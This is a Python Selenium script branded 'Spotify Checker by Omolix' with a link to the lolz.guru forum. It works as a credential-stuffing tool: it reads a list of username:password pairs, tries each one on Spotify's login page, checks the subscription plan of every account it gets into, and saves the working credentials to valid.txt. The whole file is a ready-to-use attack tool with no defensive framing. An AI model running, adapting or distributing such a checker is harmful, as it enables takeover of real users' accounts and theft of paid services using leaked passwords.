from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from time import sleep
import os
from colorama import init
from colorama import Fore, Back, Style
import ctypes

ctypes.windll.kernel32.SetConsoleTitleW("Spotify Checker by Omolix | lolz.guru/members/2196378/")
os.system('cls')

init()
if not os.path.exists('chromedriver.exe'):
	print('You dont have chromedriver.exe! Download - bit.ly/35PexKM')
	exit()
valid = open('valid.txt','w').close()
invalid = open('invalid.txt','w').close()

def checkvalid(username,password):
	try:
		valid = open('valid.txt','a')
		invalid = open('invalid.txt','a')
		driver = webdriver.Chrome(executable_path=os.path.abspath(os.curdir)+'\\chromedriver.exe')
		driver.get(url='https://accounts.spotify.com/ru/login/')
		driver.find_element_by_id("login-username").send_keys(username)
		driver.find_element_by_id("login-password").send_keys(password)
		driver.find_element_by_id("login-button").click()
		sleep(0.8)
		elements = driver.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div[1]/span/p')
		if elements == []:
			elements = ['nothing']
		for el in elements:
			if el != 'nothing':
				print(Back.RED+f'[INVALID] / {username}:{password}'+Style.RESET_ALL+Fore.BLACK)
				invalid.write(f'{username}:{password}\n')
			else:
				sleep(0.5)
				driver.find_element_by_id("account-settings-link").click()
				sleep(0.5)
				elements = driver.find_elements(By.XPATH, '//*[@id="your-plan"]/section/div/div[1]/div[1]/span')
				for element in elements:
					plan = element.text
				print(Back.GREEN+f'[VALID] / {username}:{password} | {plan}'+Style.RESET_ALL+Fore.BLACK)
				valid.write(f'{username}:{password} | {plan}\n')
		valid.close()
		invalid.close()
	except Exception as ex:
		#print(ex)
		pass


text = Fore.YELLOW+'''
				 ██████╗██████╗  █████╗ ████████╗██╗███████╗██╗   ██╗
				██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██║██╔════╝╚██╗ ██╔╝
				╚█████╗ ██████╔╝██║  ██║   ██║   ██║█████╗   ╚████╔╝ 
				 ╚═══██╗██╔═══╝ ██║  ██║   ██║   ██║██╔══╝    ╚██╔╝  
				██████╔╝██║     ╚█████╔╝   ██║   ██║██║        ██║   
				╚═════╝ ╚═╝      ╚════╝    ╚═╝   ╚═╝╚═╝        ╚═╝   
				 █████╗ ██╗  ██╗███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
				██╔══██╗██║  ██║██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
				██║  ╚═╝███████║█████╗  ██║  ╚═╝█████═╝ █████╗  ██████╔╝
				██║  ██╗██╔══██║██╔══╝  ██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
				╚█████╔╝██║  ██║███████╗╚█████╔╝██║ ╚██╗███████╗██║  ██║
				 ╚════╝ ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
				BY OMOLIX
'''+Style.RESET_ALL
op = input(text+Fore.YELLOW+'Path to file: '+Style.BRIGHT)
if not os.path.exists(op):
	print(Fore.YELLOW+'Error! Wrong path.'+Style.RESET_ALL+Fore.BLACK)
	exit()
count = len(open(op,encoding='utf-8').readlines())
print(Fore.YELLOW+f'Uploaded {count} lines.\nStarting..'+Style.RESET_ALL+Fore.BLACK)
for line in open(op,encoding='utf-8').readlines():
	line = line.rstrip().split(':')
	checkvalid(line[0],line[1])